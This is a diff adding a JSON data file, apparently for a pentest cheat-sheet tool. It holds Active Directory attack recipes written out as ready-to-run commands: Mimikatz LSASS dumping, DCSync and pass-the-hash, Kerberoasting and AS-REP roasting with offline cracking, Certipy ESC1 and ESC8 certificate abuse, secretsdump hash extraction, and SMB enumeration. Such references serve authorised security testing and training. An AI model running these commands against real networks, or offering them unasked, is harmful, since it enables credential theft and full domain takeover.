@@ -1,0 +1,96 @@
+{
+  "bloodhound": {
+    "title": "BloodHound - Active Directory Enumeration",
+    "category": "Active Directory",
+    "desc": "Map Active Directory relationships and attack paths.",
+    "steps": [
+      ["Start Neo4j database", "sudo neo4j console"],
+      ["Launch BloodHound GUI", "bloodhound"],
+      ["Collect data (Windows)", "SharpHound.exe -c All --domain domain.local"],
+      ["Linux ingestor", "bloodhound-python -u 'user' -p 'pass' -d domain.local -ns <IP> -c All"],
+      ["Import zip file", "Drag and drop the collected zip archive into BloodHound"]
+    ]
+  },
+  "mimikatz": {
+    "title": "Mimikatz - Windows Credential Dumping",
+    "category": "Active Directory",
+    "desc": "Extract plaintext passwords, hashes, and Kerberos tickets.",
+    "steps": [
+      ["Start Mimikatz", "mimikatz.exe"],
+      ["Elevate debug privilege", "privilege::debug"],
+      ["Dump LSASS logon passwords", "sekurlsa::logonpasswords"],
+      ["DCSync domain controller", "lsadump::dcsync /domain:domain.local /user:Administrator"],
+      ["Pass-the-Hash", "sekurlsa::pth /user:Administrator /ntlm:<hash> /domain:domain.local"]
+    ]
+  },
+  "kerberoast": {
+    "title": "Kerberoasting - TGS Ticket Attack",
+    "category": "Active Directory",
+    "desc": "Request TGS tickets for SPNs and crack offline.",
+    "steps": [
+      ["List SPNs and dump tickets", "GetUserSPNs.py domain.local/user:password -dc-ip <IP> -request"],
+      ["Output hashes to file", "GetUserSPNs.py domain.local/user:password -dc-ip <IP> -request -outputfile hashes.kerberoast"],
+      ["Crack with Hashcat", "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt"],
+      ["Crack with John", "john --wordlist=rockyou.txt hashes.kerberoast"]
+    ]
+  },
+  "asrep_roasting": {
+    "title": "AS-REP Roasting",
+    "category": "Active Directory",
+    "desc": "Exploit accounts with Kerberos pre-auth disabled to dump crackable hashes.",
+    "steps": [
+      ["Find pre-auth disabled accounts", "GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <IP>"],
+      ["Dump hashes with credentials", "GetNPUsers.py domain.local/user:password -dc-ip <IP> -request"],
+      ["Save hashes to file", "GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <IP> -outputfile hashes.asrep"],
+      ["Crack with Hashcat", "hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt"],
+      ["Crack with John", "john --wordlist=rockyou.txt hashes.asrep"]
+    ]
+  },
+  "adcs": {
+    "title": "AD CS / Certipy - Certificate Services Abuse",
+    "category": "Active Directory",
+    "desc": "Exploit misconfigured Active Directory Certificate Services templates (ESC1-8).",
+    "steps": [
+      ["Find vulnerable templates", "certipy find -u 'user@domain.local' -p 'password' -dc-ip <IP> -vulnerable -stdout"],
+      ["Request certificate as admin (ESC1)", "certipy req -u 'user@domain.local' -p 'password' -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip <IP>"],
+      ["Authenticate with certificate", "certipy auth -pfx administrator.pfx -dc-ip <IP>"],
+      ["Shadow credentials attack", "certipy shadow auto -u 'user@domain.local' -p 'password' -account 'TargetUser' -dc-ip <IP>"],
+      ["Relay certificate request (ESC8)", "certipy relay -target http://<CA_IP>/certsrv/certfnsh.asp -template User"]
+    ]
+  },
+  "secretsdump": {
+    "title": "secretsdump - Remote Hash Extraction",
+    "category": "Active Directory",
+    "desc": "Remotely dump NTLM hashes, SAM, and domain secrets via Impacket.",
+    "steps": [
+      ["Dump local SAM hashes", "secretsdump.py -sam sam.save -system system.save LOCAL"],
+      ["Remote NTLM hash dump", "secretsdump.py domain.local/Administrator:password@<IP>"],
+      ["DCSync all domain hashes", "secretsdump.py -just-dc domain.local/Administrator:password@<IP>"],
+      ["Pass-the-Hash remote dump", "secretsdump.py -hashes :<NTLM_HASH> domain.local/Administrator@<IP>"],
+      ["Save output to file", "secretsdump.py domain.local/admin:pass@<IP> -outputfile hashes"]
+    ]
+  },
+  "enum4linux": {
+    "title": "Enum4linux - Windows/Samba Enumeration",
+    "category": "Active Directory",
+    "desc": "Extract information from Windows and Samba systems.",
+    "steps": [
+      ["Run full enumeration", "enum4linux -a <IP>"],
+      ["List SMB shares", "enum4linux -S <IP>"],
+      ["Enumerate domain users", "enum4linux -U <IP>"],
+      ["Inspect password policy", "enum4linux -P <IP>"]
+    ]
+  },
+  "smbclient": {
+    "title": "SMBClient - Share Navigation",
+    "category": "Active Directory",
+    "desc": "Interact with SMB shares on remote servers.",
+    "steps": [
+      ["List shares anonymously", "smbclient -L //<IP> -N"],
+      ["Connect to specific share", "smbclient //<IP>/share -N"],
+      ["Connect with credentials", "smbclient //<IP>/share -U 'user%password'"],
+      ["Download remote file", "get filename"],
+      ["Upload local file", "put filename"]
+    ]
+  }
+}
